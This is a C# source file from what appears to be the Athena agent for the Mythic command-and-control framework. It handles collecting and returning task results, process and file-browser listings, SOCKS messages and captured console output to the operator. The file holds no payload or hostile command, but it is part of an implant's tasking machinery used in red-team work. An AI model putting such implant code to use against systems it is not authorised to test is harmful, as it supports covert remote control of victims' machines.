using Athena.Models;
using Athena.Models.Mythic.Tasks;
using System.Collections.Concurrent;
using System.Runtime.CompilerServices;
using Athena.Models.Responses;

namespace Athena.Plugins
{
    public class TaskResponseHandler
    {
        //Stored separately to make updating for long running tasks easier
        private static ConcurrentDictionary<string, ResponseResult> responseResults = new ConcurrentDictionary<string, ResponseResult>();
        private static ConcurrentBag<string> responseStrings = new ConcurrentBag<string>();
        private static ConcurrentDictionary<string, ProcessResponseResult> processResults = new ConcurrentDictionary<string, ProcessResponseResult>();
        private static ConcurrentDictionary<string, FileBrowserResponseResult> fileBrowserResults = new ConcurrentDictionary<string, FileBrowserResponseResult>();
        private static ConcurrentDictionary<string, string> socksMessageOut = new ConcurrentDictionary<string, string>();

        public static ConcurrentDictionary<string, MythicJob> activeJobs = new ConcurrentDictionary<string, MythicJob>();
        private static StringWriter sw = new StringWriter();
        private static bool stdOutIsMonitored = false;
        private static string monitoring_task = "";
        private static TextWriter origStdOut;
        public static void AddResponse(ResponseResult res)
        {
            if (!responseResults.ContainsKey(res.task_id))
            {
                responseResults.TryAdd(res.task_id, res);
                return;
            }

            ResponseResult newResponse = responseResults[res.task_id];

            if (!res.completed)
            {
                newResponse.completed = res.completed;
            }

            if (!string.IsNullOrEmpty(res.status))
            {
                newResponse.status = res.status;
            }
        }
        public static void AddResponse(FileBrowserResponseResult res)
        {
            if (!fileBrowserResults.ContainsKey(res.task_id))
            {
                fileBrowserResults.TryAdd(res.task_id, res);
                return;
            }

            FileBrowserResponseResult newResponse = fileBrowserResults[res.task_id];
            
            if (!res.completed)
            {
                newResponse.completed = res.completed;
            }

            if (!string.IsNullOrEmpty(res.status))
            {
                newResponse.status = res.status;
            }
        }
        public static void AddResponse(ProcessResponseResult res)
        {
            if (!processResults.ContainsKey(res.task_id))
            {
                processResults.TryAdd(res.task_id, res);
                    return;
            }

            ProcessResponseResult newResponse = processResults[res.task_id];
            if (!res.completed)
            {
                newResponse.completed = res.completed;
            }

            if (!string.IsNullOrEmpty(res.status))
            {
                newResponse.status = res.status;
            }

        }
        public static void AddResponse(string res)
        {
            responseStrings.Add(res);
        }
        public static void Write(string? output, string task_id, bool completed, string status)
        {
            responseResults.AddOrUpdate(task_id, new ResponseResult { user_output = output, completed = completed, status = status, task_id = task_id }, (k, t) =>
            {
                ResponseResult newResponse = t;
                newResponse.user_output += output;
                if (completed)
                {
                    newResponse.completed = true;
                }
                if (!string.IsNullOrEmpty(status))
                {
                    newResponse.status = status;
                }
                return newResponse;
            });
        }
        public static void WriteLine(string? output, string task_id, bool completed, string status)
        {
            responseResults.AddOrUpdate(task_id, new ResponseResult { user_output = output + Environment.NewLine, completed = completed, status = status, task_id = task_id }, (k, t) =>
            {
                var newResponse = (ResponseResult)t;
                newResponse.user_output += output + Environment.NewLine;
                if (completed)
                {
                    newResponse.completed = true;
                }
                if (!string.IsNullOrEmpty(status))
                {
                    newResponse.status = status;
                }
                return newResponse;
            });
        }
        public static void WriteLine(string? output, string task_id, bool completed)
        {
            WriteLine(output, task_id, completed, "");
        }
        public static void Write(string? output, string task_id, bool completed)
        {
            Write(output, task_id, completed, "");
        }
        public static async Task<List<string>> GetResponses()
        {
            List<string> results = new List<string>();
            foreach(ResponseResult response in responseResults.Values)
            {
                if (response.completed)
                {
                    activeJobs.Remove(response.task_id, out _);
                }
                results.Add(response.ToJson());
            }
            foreach (ProcessResponseResult response in processResults.Values)
            {
                if (response.completed)
                {
                    activeJobs.Remove(response.task_id, out _);
                }
                results.Add(response.ToJson());
            }
            foreach (FileBrowserResponseResult response in fileBrowserResults.Values)
            {
                if (response.completed)
                {
                    activeJobs.Remove(response.task_id, out _);
                }
                results.Add(response.ToJson());
            }
            foreach(string response in responseStrings)
            {
                results.Add(response);
            }

            fileBrowserResults.Clear();
            responseResults.Clear();
            processResults.Clear();
            responseStrings.Clear();
            return results;
        }
        public static async Task ReturnResponses(List<string> responses)
        {
            List<string> tmpResponse = new List<string>();
            responses.ForEach(response => tmpResponse = TaskResponseHandler.responseStrings.Prepend<string>(response).ToList());
            TaskResponseHandler.responseStrings = new ConcurrentBag<string>(tmpResponse);
        }

        public static bool CaptureStdOut(string task_id)
        {
            if (stdOutIsMonitored)
            {
                return false;
            }
            try
            {
                monitoring_task = task_id;
                origStdOut = Console.Out;
                Console.SetOut(sw);
                stdOutIsMonitored = true;
                return true;
            }
            catch
            {
                return false;
            }
        }

        public static void ReleaseStdOut()
        {
            stdOutIsMonitored = false;
            Console.SetOut(origStdOut);
        }

        public static bool StdIsBusy()
        {
            return stdOutIsMonitored;
        }
        public static string StdOwner()
        {
            return monitoring_task;
        }
        public async static Task<string> GetStdOut()
        {
            await sw.FlushAsync();
            string output = sw.GetStringBuilder().ToString();

            //Clear the writer
            sw.GetStringBuilder().Clear();
            return output;
        }
    }
}
